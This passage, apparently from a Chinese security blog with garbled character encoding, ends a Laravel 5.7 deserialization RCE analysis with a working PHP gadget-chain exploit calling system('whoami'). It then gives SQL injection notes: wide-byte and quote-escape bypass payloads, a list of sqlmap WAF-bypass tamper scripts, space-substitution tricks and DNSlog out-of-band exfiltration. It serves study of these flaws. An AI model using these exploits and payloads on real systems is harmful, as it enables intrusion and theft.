<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">                $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>$callback</code>å‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œç¬¬äºŒä¸ªå‚æ•°ç”±å‡½æ•°<code>getMethodDependencies()</code>æ§åˆ¶ï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹<br><img src="call2.png" alt="call2"></p>
</li>
<li><p>ç»è¿‡è°ƒè¯•ï¼Œå¾—å‡ºç»“è®ºï¼šå®ƒå°†æˆ‘ä»¬ä¼ å…¥çš„<code>$parameters</code>æ•°ç»„å’Œ$<code>dependencies</code>æ•°ç»„åˆå¹¶ï¼Œå…¶ä¸­<code>$dependencies</code>æ•°ç»„ä¸ºç©ºï¼Œè€Œ<code>$parameters</code>æ•°ç»„æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚æœ€ç»ˆä¹Ÿå°±æ˜¯æ‰§è¡Œäº†<code>call_user_func_array(&#39;xxx&#39;,array(&#39;xxx&#39;))</code></p>
</li>
</ul>
<h1 id="æœ¬åœ°ç¯å¢ƒå¤ç°"><a href="#æœ¬åœ°ç¯å¢ƒå¤ç°" class="headerlink" title="æœ¬åœ°ç¯å¢ƒå¤ç°"></a>æœ¬åœ°ç¯å¢ƒå¤ç°</h1><p>expæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;                 <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;                   <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;           <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;     <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array('id')</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instances = [])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">'Illuminate\Contracts\Console\Kernel'</span>] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("<span class="title">hello</span>" =&gt; "<span class="title">world</span>"));</span><br><span class="line"></span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line"></span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line"></span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'whoami'</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>æœ€åè´´ä¸Šåˆ©ç”¨æˆªå›¾<br><img src="exp.png" alt="exp"></li>
</ul>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ul>
<li>è¿™ä¸ªååºåˆ—åŒ–RCEé‡è¦çš„ç‚¹ï¼š<ul>
<li>åœ¨è¿›å…¥run()å‡½æ•°ï¼Œè¿è¡Œåˆ°call()å‰ï¼Œéœ€è¦bypass<code>mockConsoleOutput()</code>å’Œ<code>mockConsoleOutput()</code>ï¼Œç”±äºæŸä¸ªå±æ€§çš„ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬éœ€è¦é­”æ³•å‡½æ•°<code>__get()</code>è¿”å›æ•°ç»„æ¥é¡ºåˆ©è¿è¡Œä¸‹æ–‡çš„ä»£ç </li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>Laravel5.7</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºsqlæ³¨å…¥</title>
    <url>/2019/11/25/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>å®½å­—èŠ‚æ³¨å…¥ï¼Œbypassï¼Œdnslogæ³¨å…¥ï¼Œlimitæ³¨å…¥</p>
<a id="more"></a>
<h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><p>å®½å­—èŠ‚æ³¨å…¥æ˜¯ç”±äºè½¬ç¼–ç è€Œå½¢æˆçš„ï¼Œé‚£å…·æœ‰è½¬ç¼–ç åŠŸèƒ½çš„å‡½æ•°ä¹Ÿæˆäº†æ¼æ´çš„æˆå› ã€‚</p>
<h2 id="UTF8"><a href="#UTF8" class="headerlink" title="UTF8"></a>UTF8</h2><p>ç”±äºASCIIè¡¨ç¤ºçš„å­—ç¬¦åªæœ‰128ä¸ªï¼Œå› æ­¤ç½‘ç»œä¸–ç•Œçš„è§„èŒƒæ˜¯ä½¿ç”¨UNICODEç¼–ç ï¼Œä½†æ˜¯ç”¨ASCIIè¡¨ç¤ºçš„å­—ç¬¦ä½¿ç”¨UNICODEå¹¶ä¸é«˜æ•ˆã€‚å› æ­¤å‡ºç°äº†ä¸­é—´æ ¼å¼å­—ç¬¦é›†ï¼Œè¢«ç§°ä¸ºé€šç”¨è½¬æ¢æ ¼å¼ï¼ŒåŠUTFï¼ˆUniversal Transformation Formatï¼‰ã€‚</p>
<h2 id="å®½å­—èŠ‚"><a href="#å®½å­—èŠ‚" class="headerlink" title="å®½å­—èŠ‚"></a>å®½å­—èŠ‚</h2><p>GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JISç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ã€‚å®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒASCIIå­—ç¬¦ï¼ˆä¸€å­—èŠ‚ï¼‰çš„ç°è±¡ã€‚</p>
<blockquote>
<p>GB2312æ˜¯è¢«GBKå…¼å®¹çš„ï¼Œå®ƒçš„é«˜ä½èŒƒå›´æ˜¯0xA1<del>0xF7ï¼Œä½ä½èŒƒå›´æ˜¯0xA1</del>0xFEï¼ˆ0x5Cä¸åœ¨è¯¥èŒƒå›´å†…ï¼‰ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨ç¼–ç åƒæ‰%5cã€‚<br>å…¶å®ƒçš„å®½å­—ç¬¦é›†ä¹Ÿæ˜¯ä¸€æ ·çš„åˆ†æè¿‡ç¨‹ï¼Œè¦åƒæ‰%5cï¼Œåªéœ€è¦ä½ä½ä¸­åŒ…å«æ­£å¸¸çš„0x5cå°±è¡Œäº†ã€‚</p>
</blockquote>
<ul>
<li><strong>å®½å­—èŠ‚æ³¨å…¥ä¸HTMLé¡µé¢ç¼–ç æ˜¯æ— å…³çš„</strong><br>å®½å­—èŠ‚å¯¹è½¬ä¹‰å­—ç¬¦çš„å½±å“å‘ç”Ÿåœ¨<code>character_set_client=gbk</code>çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœ<strong>å®¢æˆ·ç«¯å‘é€çš„æ•°æ®å­—ç¬¦é›†æ˜¯<code>gbk</code></strong>ï¼Œåˆ™å¯èƒ½ä¼šåƒæ‰è½¬ä¹‰å­—ç¬¦<code>\</code>ï¼Œä»è€Œå¯¼è‡´è½¬ä¹‰å¤±è´¥ã€‚</li>
<li>ä½¿ç”¨äº†<code>addslashes</code>å‡½æ•°<br>GBKç¼–ç ï¼Œå®ƒçš„ç¼–ç èŒƒå›´æ˜¯0x8140~0xFEFEï¼ˆä¸åŒ…æ‹¬<code>0xxx7F</code>ï¼‰ï¼Œåœ¨é‡åˆ°<code>%df:(ascii(223)) &gt;ascii(128)</code>æ—¶è‡ªåŠ¨æ‹¼æ¥%5cï¼Œå› æ­¤åƒæ‰â€˜\â€™ï¼Œè€Œ%27ã€%20å°äºascii(128)çš„å­—ç¬¦å°±ä¿ç•™äº†ã€‚<br><code>%df%27</code>ï¼Œä¼šæŠŠå®ƒçœ‹æˆä¸€ä¸ªæ±‰å­—ï¼Œä½†æ˜¯%27ä¼šé—­åˆå‰é¢çš„å•å¼•å·</li>
</ul>
<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="HPPï¼š"><a href="#HPPï¼š" class="headerlink" title="HPPï¼š"></a>HPPï¼š</h2><p>HPPæ˜¯æŒ‡HTTPå‚æ•°æ±¡æŸ“-HTTP Parameter Pollutionã€‚å½“æŸ¥è¯¢å­—ç¬¦ä¸²å¤šæ¬¡å‡ºç°åŒä¸€ä¸ªkeyæ—¶ï¼Œæ ¹æ®å®¹å™¨ä¸åŒä¼šå¾—åˆ°ä¸åŒçš„ç»“æœã€‚å‡è®¾æäº¤çš„å‚æ•°å³ä¸ºï¼š<br><code>id=1&amp;id=2&amp;id=3</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è§£æç»“æœ</span><br><span class="line">Asp.net + iisï¼šid=1,2,3</span><br><span class="line">Asp + iisï¼šid=1,2,3</span><br><span class="line">Php + apacheï¼šid=3</span><br></pre></td></tr></table></figure>
<h2 id="sqlmapçš„å„ç§bypass-waf-tamperï¼š"><a href="#sqlmapçš„å„ç§bypass-waf-tamperï¼š" class="headerlink" title="sqlmapçš„å„ç§bypass waf tamperï¼š"></a>sqlmapçš„å„ç§bypass waf tamperï¼š</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apostrophemask.py ç”¨UTF-8å…¨è§’å­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦</span><br><span class="line">apostrophenullencode.py ç”¨éæ³•åŒå­—èŠ‚unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦</span><br><span class="line">appendnullbyte.py åœ¨payloadæœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ç¼–ç </span><br><span class="line">base64encode.py å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨Base64ç¼–ç </span><br><span class="line">between.py åˆ†åˆ«ç”¨â€œNOT BETWEEN 0 AND #â€æ›¿æ¢å¤§äºå·â€œ&gt;â€ï¼Œâ€œBETWEEN # AND #â€æ›¿æ¢ç­‰äºå·â€œ=â€</span><br><span class="line">bluecoat.py åœ¨SQLè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨â€œLIKEâ€æ›¿æ¢ç­‰äºå·â€œ=â€</span><br><span class="line">chardoubleencode.py å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line">charencode.py å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line">charunicodeencode.py å¯¹ç»™å®šçš„payloadçš„éç¼–ç å­—ç¬¦ä½¿ç”¨Unicode URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</span><br><span class="line">concat2concatws.py ç”¨â€œCONCAT_WS(MID(CHAR(0), 0, 0), A, B)â€æ›¿æ¢åƒâ€œCONCAT(A, B)â€çš„å®ä¾‹</span><br><span class="line">equaltolike.py ç”¨â€œLIKEâ€è¿ç®—ç¬¦æ›¿æ¢å…¨éƒ¨ç­‰äºå·â€œ=â€</span><br><span class="line">greatest.py ç”¨â€œGREATESTâ€å‡½æ•°æ›¿æ¢å¤§äºå·â€œ&gt;â€</span><br><span class="line">halfversionedmorekeywords.py åœ¨æ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ MySQLæ³¨é‡Š</span><br><span class="line">ifnull2ifisnull.py ç”¨â€œIF(ISNULL(A), B, A)â€æ›¿æ¢åƒâ€œIFNULL(A, B)â€çš„å®ä¾‹</span><br><span class="line">lowercase.py ç”¨å°å†™å€¼æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦</span><br><span class="line">modsecurityversioned.py ç”¨æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢</span><br><span class="line">modsecurityzeroversioned.py ç”¨å½“ä¸­å¸¦æœ‰æ•°å­—é›¶çš„æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢</span><br><span class="line">multiplespaces.py åœ¨SQLå…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼</span><br><span class="line">nonrecursivereplacement.py ç”¨representationsæ›¿æ¢é¢„å®šä¹‰SQLå…³é”®å­—ï¼Œé€‚ç”¨äºè¿‡æ»¤å™¨</span><br><span class="line">overlongutf8.py è½¬æ¢ç»™å®šçš„payloadå½“ä¸­çš„æ‰€æœ‰å­—ç¬¦</span><br><span class="line">percentage.py åœ¨æ¯ä¸ªå­—ç¬¦ä¹‹å‰æ·»åŠ ä¸€ä¸ªç™¾åˆ†å·</span><br><span class="line">randomcase.py éšæœºè½¬æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦çš„å¤§å°å†™</span><br><span class="line">randomcomments.py å‘SQLå…³é”®å­—ä¸­æ’å…¥éšæœºæ³¨é‡Š</span><br><span class="line">securesphere.py æ·»åŠ ç»è¿‡ç‰¹æ®Šæ„é€ çš„å­—ç¬¦ä¸²</span><br><span class="line">sp_password.py å‘payloadæœ«å°¾æ·»åŠ â€œsp_passwordâ€ for automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py ç”¨â€œ/**/â€æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2dash.py ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2hash.py ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2morehash.py ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2mssqlblank.py ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2mssqlhash.py ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2mysqlblank.py ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2mysqldash.py ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2plus.py ç”¨åŠ å·â€œ+â€æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">space2randomblank.py ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">unionalltounion.py ç”¨â€œUNION SELECTâ€æ›¿æ¢â€œUNION ALL SELECTâ€</span><br><span class="line">unmagicquotes.py ç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼ç¬¦</span><br><span class="line">varnish.py æ·»åŠ ä¸€ä¸ªHTTPå¤´â€œX-originating-IPâ€æ¥ç»•è¿‡WAF</span><br><span class="line">versionedkeywords.py ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªéå‡½æ•°å…³é”®å­—</span><br><span class="line">versionedmorekeywords.py ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªå…³é”®å­—</span><br><span class="line">xforwardedfor.py æ·»åŠ ä¸€ä¸ªä¼ªé€ çš„HTTPå¤´â€œX-Forwarded-Forâ€æ¥ç»•è¿‡WAF</span><br></pre></td></tr></table></figure>
<h2 id="mysqlç”¨æˆ·è‡ªå®šä¹‰å˜é‡"><a href="#mysqlç”¨æˆ·è‡ªå®šä¹‰å˜é‡" class="headerlink" title="mysqlç”¨æˆ·è‡ªå®šä¹‰å˜é‡"></a>mysqlç”¨æˆ·è‡ªå®šä¹‰å˜é‡</h2><ul>
<li>å¯ä»¥å…ˆåœ¨ç”¨æˆ·å˜é‡ä¸­ä¿å­˜å€¼ç„¶ååœ¨ä»¥åå¼•ç”¨å®ƒï¼›è¿™æ ·å¯ä»¥å°†å€¼ä»ä¸€ä¸ªè¯­å¥ä¼ é€’åˆ°å¦ä¸€ä¸ªè¯­å¥ã€‚ç”¨æˆ·å˜é‡ä¸è¿æ¥æœ‰å…³ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯å®šä¹‰çš„å˜é‡ä¸èƒ½è¢«å…¶å®ƒå®¢æˆ·ç«¯çœ‹åˆ°æˆ–ä½¿ç”¨ã€‚å½“å®¢æˆ·ç«¯é€€å‡ºæ—¶ï¼Œè¯¥å®¢æˆ·ç«¯è¿æ¥çš„æ‰€æœ‰å˜é‡å°†è‡ªåŠ¨é‡Šæ”¾ã€‚</li>
<li>ç”¨æˆ·å˜é‡çš„å½¢å¼ä¸º@var_nameï¼Œå…¶ä¸­å˜é‡åvar_nameå¯ä»¥ç”±å½“å‰å­—ç¬¦é›†çš„æ–‡å­—æ•°å­—å­—ç¬¦ã€â€˜.â€™ã€â€˜_â€™å’Œâ€˜$â€™ç»„æˆã€‚ é»˜è®¤å­—ç¬¦é›†æ˜¯cp1252 (Latin1)ã€‚å¯ä»¥ç”¨mysqldçš„<code>--default-character-set</code>é€‰é¡¹æ›´æ”¹å­—ç¬¦é›†ã€‚ç”¨æˆ·å˜é‡åå¯¹å¤§å°å†™ä¸æ•æ„Ÿã€‚</li>
</ul>
<p><strong>è®¾ç½®ç”¨æˆ·å˜é‡çš„ä¸€ä¸ªé€”å¾„æ˜¯æ‰§è¡ŒSETè¯­å¥</strong><br><code>SET @var_name = expr [, @var_name = expr] ...</code></p>
<ul>
<li>å¯¹äºSETï¼Œå¯ä»¥ä½¿ç”¨<code>=</code>æˆ–<code>:=</code>ä½œä¸ºåˆ†é…ç¬¦ã€‚åˆ†é…ç»™æ¯ä¸ªå˜é‡çš„exprå¯ä»¥ä¸ºæ•´æ•°ã€å®æ•°ã€å­—ç¬¦ä¸²æˆ–è€…NULLå€¼ã€‚</li>
<li>ä¹Ÿå¯ä»¥ç”¨è¯­å¥ä»£æ›¿SETæ¥ä¸ºç”¨æˆ·å˜é‡åˆ†é…ä¸€ä¸ªå€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåˆ†é…ç¬¦å¿…é¡»ä¸º<code>:=</code>è€Œä¸èƒ½ç”¨<code>=</code>ï¼Œå› ä¸ºåœ¨éSETè¯­å¥ä¸­<code>=</code>è¢«è§†ä¸ºä¸€ä¸ªæ¯”è¾ƒ æ“ä½œç¬¦ï¼š<h2 id="è¿‡æ»¤å•å¼•å·"><a href="#è¿‡æ»¤å•å¼•å·" class="headerlink" title="è¿‡æ»¤å•å¼•å·"></a>è¿‡æ»¤å•å¼•å·</h2>è¿‡æ»¤å•å¼•å·<br>  username è¾“å…¥<code>1\</code><br>  password è¾“å…¥<code>or 1=1;#</code><br>sql:<code>select * form user_table where username = &#39;1\&#39; and password = &#39;or 1=1;#&#39;</code><br>usernameä¸­è¾“å…¥çš„\è½¬ä¹‰äº†å®ƒåé¢çš„å•å¼•å·ï¼Œæ‰€ä»¥æ­¤æ—¶<code>username =&#39;1\ and password = &#39;</code>ï¼Œåé¢çš„<code>or 1=1;</code>å°±ç”Ÿæ•ˆäº†<h2 id="sqlè¯­å¥ä¸­ç©ºæ ¼çš„ä»£æ›¿æ–¹æ³•"><a href="#sqlè¯­å¥ä¸­ç©ºæ ¼çš„ä»£æ›¿æ–¹æ³•" class="headerlink" title="sqlè¯­å¥ä¸­ç©ºæ ¼çš„ä»£æ›¿æ–¹æ³•"></a>sqlè¯­å¥ä¸­ç©ºæ ¼çš„ä»£æ›¿æ–¹æ³•</h2></li>
<li>è¿‡æ»¤ç©ºæ ¼<br>urlç¼–ç ä¸ºï¼š<code>%20</code>ï¼ŒåŒå†™ä¸º<code>%2%200</code><br>ä¹Ÿå¯å†™ä½œ<code>%a0</code><br>å¸¸è§çš„ç»•è¿‡ç©ºæ ¼çš„å°±æ˜¯å¤šè¡Œæ³¨é‡Š<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*!50540select user()*/             mysql(ç‹¬æœ‰)å†…è”æ³¨é‡Š,!åé¢çš„æ•°å­—æ˜¯ç‰ˆæœ¬å·ï¼Œè¡¨ç¤ºå½“æ•°æ®åº“ç‰ˆæœ¬&gt;=5.5.40æ—¶æ‰§è¡ŒSQLè¯­å¥(ç‰ˆæœ¬å·äº”ä½)</span><br><span class="line">/**/                                mysqlå¤šè¡Œæ³¨é‡Š</span><br><span class="line">%09,%0a,%0b,%0c,%0d,%20,%a0         ä¸€äº›ç©ºç™½å­—ç¬¦</span><br><span class="line">1.1ã€2.3ã€1.                        æµ®ç‚¹æ•°å½¢å¼</span><br><span class="line">0e1ã€1e7                            ç§‘å­¦è®¡æ•°æ³•</span><br><span class="line">+ã€-ã€!ã€@ã€~ã€&#123;&#125;ã€&quot;ã€&apos;ã€()ã€``      ä¸€äº›ç‰¹æ®Šå­—ç¬¦</span><br></pre></td></tr></table></figure>
<h1 id="SQLæ³¨å…¥ä¹‹åŸºäºDNSçš„æ³¨å…¥-DNSlogæ³¨å…¥"><a href="#SQLæ³¨å…¥ä¹‹åŸºäºDNSçš„æ³¨å…¥-DNSlogæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥ä¹‹åŸºäºDNSçš„æ³¨å…¥(DNSlogæ³¨å…¥)"></a>SQLæ³¨å…¥ä¹‹åŸºäºDNSçš„æ³¨å…¥(DNSlogæ³¨å…¥)</h1>æµ‹è¯•ä¸€äº›ç½‘ç«™çš„æ—¶å€™ï¼Œä¸€äº›æ³¨å…¥éƒ½æ˜¯æ— å›æ˜¾çš„ï¼Œæˆ‘ä»¬å¯ä»¥å†™è„šæœ¬æ¥è¿›è¡Œç›²æ³¨ï¼Œä½†æœ‰äº›ç½‘ç«™ä¼šbanæ‰æˆ‘ä»¬çš„ipï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®ipä»£ç†æ± è§£å†³ï¼Œä½†æ˜¯ç›²æ³¨å¾€å¾€æ•ˆç‡å¾ˆä½ï¼Œæ‰€ä»¥äº§ç”Ÿäº†DNSlogæ³¨å…¥ã€‚</li>
<li>dnsåœ¨é€’å½’æŸ¥è¯¢æ—¶ï¼Œä¼šåœ¨dnsæœåŠ¡å™¨ä¸Šä¿å­˜logï¼Œæ‰€æœ‰ç»è¿‡dnsæœåŠ¡å™¨ä»¥åŠå…¶å­åŸŸåçš„æŸ¥è¯¢éƒ½ä¼šåœ¨ä¸Šé¢ç•™ä¸‹è®°å½•</li>
<li>load_file()ä¸ä»…å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥å¯¹<code>\\example.com</code>è¿™æ ·çš„urlå‘èµ·è¯·æ±‚</li>
</ul>
<ol>
<li>show variables like â€˜%secure%â€™æŸ¥çœ‹load_file()å¯ä»¥è¯»å–çš„ç£ç›˜ã€‚<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_file_privä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚</span><br><span class="line"></span><br><span class="line">secure_file_privä¸ºD:\wamp\tmpï¼Œå°±å¯ä»¥è¯»å–Gç›˜ä¸‹wamp\tmpçš„æ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">secure_file_privä¸ºnullï¼Œload_fileå°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure></li>
<li>é€šè¿‡æ›´æ”¹mysqlé…ç½®æ–‡ä»¶<code>my.ini</code>,è®¾ç½®secure_file_priv=â€â€å°±æ˜¯å¯ä»¥load_flieä»»æ„ç£ç›˜çš„æ–‡ä»¶ã€‚</li>
</ol>
<ul>
<li>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨dnslogå¹³å°æˆ–è€…è‡ªå·±æ­å»ºdnsæœåŠ¡å™¨ï¼Œå‡è®¾dnslogå¹³å°ç»™ä½ åˆ†é…äº†ä¸€ä¸ªä¸‰çº§çº§åŸŸåï¼š<code>abc.dns.com</code>ï¼Œå¦‚æœæŸ¥è¯¢ä¸‰çº§åŸŸå<code>xxx.abc.dns.com</code>ï¼Œå°±ä¼šåœ¨dnsæœåŠ¡å™¨ä¸­ç•™ä¸‹è®°å½•,æˆ‘ä»¬å¯ä»¥å°†payloadå†™åœ¨ç¬¬å››çº§åŸŸåçš„ä½ç½®</li>
